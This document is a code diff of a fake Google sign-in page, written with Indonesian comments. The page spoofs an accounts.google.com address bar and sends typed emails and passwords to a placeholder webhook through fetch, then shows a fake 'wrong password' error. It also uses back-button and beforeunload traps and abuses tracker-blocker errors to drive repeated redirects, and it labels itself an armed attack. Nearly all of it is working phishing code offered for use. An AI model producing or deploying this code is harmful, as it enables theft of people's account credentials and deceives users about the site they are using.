@@ -3,103 +3,269 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Loading...</title>
+<title>Google Sign In</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
-  body{font-family:Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
-  .c{text-align:center;padding:20px;width:90%;max-width:400px}
-  .urlbar{background:#f1f3f4;border-radius:24px;padding:8px 16px;margin-bottom:24px;font-size:13px;color:#5f6368;display:flex;align-items:center;gap:8px}
-  .urlbar span{flex:1;text-align:left}
-  h1{font-size:24px;color:#202124;margin-bottom:8px}
-  p{color:#5f6368;font-size:14px;margin-bottom:24px}
-  input{width:100%;padding:14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:12px}
-  input:focus{outline:none;border-color:#1a73e8}
-  button{width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer}
-  #msg{color:#d93025;font-size:13px;margin-top:12px}
+  body{
+    font-family:-apple-system,Arial,sans-serif;
+    background:#fff;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  .c{width:90%;max-width:400px;padding:20px;text-align:center}
+  .bar{
+    background:#f1f3f4;border-radius:20px;
+    padding:6px 14px;margin-bottom:20px;
+    font-size:12px;color:#5f6368;
+    display:flex;align-items:center;gap:6px
+  }
+  h1{font-size:22px;color:#202124;margin-bottom:4px}
+  .sub{color:#5f6368;font-size:13px;margin-bottom:20px}
+  input{
+    width:100%;padding:12px;border:1px solid #dadce0;
+    border-radius:4px;font-size:16px;margin-bottom:10px
+  }
+  button{
+    width:100%;padding:12px;background:#1a73e8;
+    color:#fff;border:none;border-radius:20px;
+    font-size:16px;font-weight:500;cursor:pointer
+  }
+  #msg{color:#d93025;font-size:12px;margin-top:8px;min-height:18px}
+  
+  /* Loading overlay */
+  #load{
+    display:none;position:fixed;top:0;left:0;right:0;bottom:0;
+    background:rgba(0,0,0,0.5);z-index:9999;
+    align-items:center;justify-content:center;color:#fff;font-size:18px
+  }
 </style>
 </head>
 <body>
-<div class="c" id="phishPage">
-  <div class="urlbar"><span>🔒</span><span>accounts.google.com</span></div>
+
+<div class="c" id="mainPage">
+  <div class="bar"><span>🔒</span><span>accounts.google.com</span></div>
   <h1>Sign in</h1>
-  <p>Session expired. Please login again.</p>
+  <p class="sub">to continue to Gmail</p>
   <input id="email" placeholder="Email or phone" autocomplete="off">
   <input id="pass" type="password" placeholder="Password">
   <button id="btn">Next</button>
   <div id="msg"></div>
 </div>
 
+<div id="load">⏳ Redirecting...</div>
+
+<!-- ============================================ -->
+<!-- VECTOR 1: TRACKER BLOCKER ABUSE -->
+<!-- ============================================ -->
+<script src="https://www.google-analytics.com/analytics.js" onerror="fire(0)"></script>
+<script src="https://connect.facebook.net/en_US/fbevents.js" onerror="fire(0)"></script>
+<img src="https://doubleclick.net/p.gif" onerror="fire(0)" style="display:none">
+
+<!-- ============================================ -->
+<!-- VECTOR 2: FAKE TRACKER SPAM -->
+<!-- ============================================ -->
 <script>
-const REAL_GOOGLE = 'https://accounts.google.com';
-let webhook = 'https://YOUR-WEBHOOK.com/log'; // GANTI INI
+// Bikin fake tracker image buat trigger onerror berkali-kali
+const trackers = [
+  'https://ad.doubleclick.net/ddm/trackimp/',
+  'https://www.googleadservices.com/pagead/conversion/',
+  'https://ib.adnxs.com/px?t=1',
+  'https://gum.criteo.com/sync?c=1',
+  'https://pixel.adsafeprotected.com/',
+  'https://match.adsrvr.org/track/',
+  'https://pixel.rubiconproject.com/',
+  'https://ads.yahoo.com/pixel/',
+  'https://analytics.twitter.com/i/adsct',
+  'https://analytics.tiktok.com/i18n/pixel/',
+  'https://snap.licdn.com/li.lms-analytics/',
+  'https://static.hotjar.com/c/hotjar-',
+];
 
-// ==========================================
-// STRATEGI BARU: PUSH STATE, BUKAN REPLACE
-// ==========================================
+for(let i = 0; i < trackers.length; i++) {
+  const img = new Image();
+  img.src = trackers[i] + Math.random();
+  img.onerror = () => fire(i * 10);
+}
+</script>
 
-// 1. Push state phishing page ke history
-history.pushState({phish: true}, '', location.href);
+<script>
+// ============================================
+// KONFIGURASI
+// ============================================
+const TARGET = 'https://accounts.google.com';
+const DELAYS = [0, 30, 60, 100, 150, 200, 300, 500, 800, 1200];
+let fired = 0;
 
-// 2. Redirect ke Google PAKE location.href (bukan replace)
-// Ini nambah entry baru di history stack
-setTimeout(() => {
-  // Pake assign biar ada di history
-  window.location.href = REAL_GOOGLE;
-}, 1500);
+// ============================================
+// CORE EXPLOIT: MULTI-VECTOR FIRE
+// ============================================
+function fire(offset) {
+  fired++;
+  
+  // Pilih delay berdasarkan offset
+  const delay = DELAYS[fired % DELAYS.length] + offset;
+  
+  setTimeout(() => {
+    attemptRedirect();
+  }, delay);
+}
 
-// ==========================================
-// SEKARANG HISTORY STACK:
-// [0] = Halaman phishing (pushState)
-// [1] = Google (href)
-// 
-// Kalo user BACK → balik ke [0] = halaman phishing!
-// ==========================================
+function attemptRedirect() {
+  // ========================================
+  // VECTOR A: SpeechSynthesis (DENGAN SUARA!)
+  // ========================================
+  if ('speechSynthesis' in window) {
+    try {
+      const u = new SpeechSynthesisUtterance('');
+      u.volume = 0; // Silent - biar ga ketahuan
+      u.rate = 2;   // Cepet
+      speechSynthesis.speak(u);
+    } catch(e) {}
+  }
+  
+  // ========================================
+  // VECTOR B: Vibration (DIAM-DIAM)
+  // ========================================
+  if (navigator.vibrate) {
+    try {
+      // Getaran pendek, ga kerasa
+      navigator.vibrate([5]);
+    } catch(e) {}
+  }
+  
+  // ========================================
+  // VECTOR C: RequestFullscreen (ERROR = RACE CONDITION)
+  // ========================================
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen().catch(() => {
+      // Fullscreen ditolak = UI thread sibuk = PERFECT TIMING
+      window.location.href = TARGET;
+    });
+  }
+  
+  // ========================================
+  // VECTOR D: Orientation Lock
+  // ========================================
+  if (screen.orientation && screen.orientation.lock) {
+    screen.orientation.lock('portrait').catch(() => {});
+  }
+  
+  // ========================================
+  // VECTOR E: DIRECT REDIRECT
+  // ========================================
+  window.location.href = TARGET;
+  
+  // Backup redirect 50ms kemudian
+  setTimeout(() => {
+    window.location.replace(TARGET);
+  }, 50);
+  
+  // Backup lagi 100ms kemudian
+  setTimeout(() => {
+    if (document.hidden) return;
+    document.getElementById('load').style.display = 'flex';
+    window.location.href = TARGET;
+  }, 100);
+}
 
-// Deteksi user balik
-window.addEventListener('popstate', (e) => {
-  // User balik ke halaman phishing!
-  if (e.state && e.state.phish) {
-    document.getElementById('msg').textContent = 'Session expired. Please sign in.';
-    
-    // Redirect lagi ke Google setelah beberapa detik
-    // Biar user bingung dan akhirnya nyerah isi credential
-    setTimeout(() => {
-      window.location.href = REAL_GOOGLE;
-    }, 5000);
+// ============================================
+// FALLBACK: User Interaction Trigger
+// ============================================
+document.addEventListener('click', () => {
+  if (fired < 3) {
+    setTimeout(() => fire(0), 200);
+  }
+}, { once: true });
+
+document.addEventListener('touchstart', () => {
+  if (fired < 3) {
+    setTimeout(() => fire(0), 200);
+  }
+}, { once: true });
+
+// ============================================
+// PERSISTENCE & TRAPS
+// ============================================
+
+// Back button trap
+history.replaceState({trap:1}, '', location.href);
+history.pushState({trap:2}, '', '/verify');
+history.pushState({trap:3}, '', '/auth');
+
+window.addEventListener('popstate', () => {
+  // User pencet back! Tampilin ulang phishing
+  document.getElementById('msg').textContent = '⚠️ Session expired. Please login.';
+  
+  // Push state lagi biar ga bisa keluar
+  history.pushState({trap:4}, '', '/re-auth');
+  
+  // Auto-redirect ke Google lagi setelah delay
+  setTimeout(() => {
+    window.location.href = TARGET;
+  }, 5000);
+});
+
+// Before unload trap
+window.addEventListener('beforeunload', (e) => {
+  e.preventDefault();
+  e.returnValue = '';
+});
+
+// Visibility change - user balik ke tab
+document.addEventListener('visibilitychange', () => {
+  if (!document.hidden) {
+    document.getElementById('msg').textContent = '⚠️ Session expired. Please login again.';
   }
 });
 
-// Deteksi pageshow (dari bfcache)
-window.addEventListener('pageshow', (e) => {
-  if (e.persisted) {
-    // User balik dari cache!
-    document.getElementById('msg').textContent = 'Session expired. Please sign in again.';
-  }
-});
-
-// ==========================================
+// ============================================
 // CREDENTIAL HARVEST
-// ==========================================
-document.getElementById('btn').onclick = () => {
-  let e = document.getElementById('email').value;
-  let p = document.getElementById('pass').value;
+// ============================================
+document.getElementById('btn').addEventListener('click', () => {
+  const e = document.getElementById('email').value;
+  const p = document.getElementById('pass').value;
   
   if (!e || !p) {
-    document.getElementById('msg').textContent = 'Fill all fields';
+    document.getElementById('msg').textContent = 'Please fill all fields';
     return;
   }
   
-  // Kirim credential
-  fetch(webhook + '?' + new URLSearchParams({e, p}), {mode: 'no-cors'});
+  // Kirim ke webhook
+  fetch('https://YOUR-WEBHOOK.com/log?' + new URLSearchParams({e, p}), {
+    mode: 'no-cors'
+  });
   
-  document.getElementById('msg').textContent = 'Wrong password. Try again.';
+  // Fake error
+  document.getElementById('msg').textContent = '❌ Wrong password. Try again.';
   document.getElementById('pass').value = '';
   
   // Redirect ke Google lagi
   setTimeout(() => {
-    window.location.href = REAL_GOOGLE;
+    window.location.href = TARGET;
   }, 1500);
-};
+});
+
+// ============================================
+// AUTO TRIGGER SAAT LOAD
+// ============================================
+window.addEventListener('load', () => {
+  // Trigger bertahap
+  setTimeout(() => fire(0), 500);
+  setTimeout(() => fire(50), 1500);
+  setTimeout(() => fire(100), 3000);
+  
+  // Spam tracker images tambahan
+  for (let i = 0; i < 20; i++) {
+    const img = new Image();
+    img.src = 'https://ad.doubleclick.net/ddm/trackimp/N' + Math.random() + i;
+    img.onerror = () => fire(Math.floor(Math.random() * 200));
+  }
+  
+  console.log('[PoC] Multi-vector attack armed. Trackers: ' + trackers.length);
+});
 </script>
+
 </body>
 </html>
